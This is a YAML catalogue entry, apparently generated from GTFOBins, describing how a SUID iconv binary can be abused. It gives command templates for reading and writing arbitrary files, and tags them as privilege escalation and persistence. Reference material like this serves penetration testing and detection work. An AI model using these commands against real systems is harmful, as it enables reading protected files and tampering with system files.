@@ -1,0 +1,85 @@
+id: gtfobins/iconv/file-write/suid
+type: binary
+platform: linux
+name: iconv
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
+references:
+- https://gtfobins.github.io/gtfobins/iconv/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        iconv:
+          comment: The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows
+            to read/write arbitrary files. Other encoding combinations may corrupt the result.
+          functions:
+            file-read:
+            - code: iconv -f 8859_1 -t 8859_1 /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/iconv/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-write
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:f4b33751a6b790fa03eff2a8b315e048fe569ec8504cfb6cbb1b5c089b0beaaf
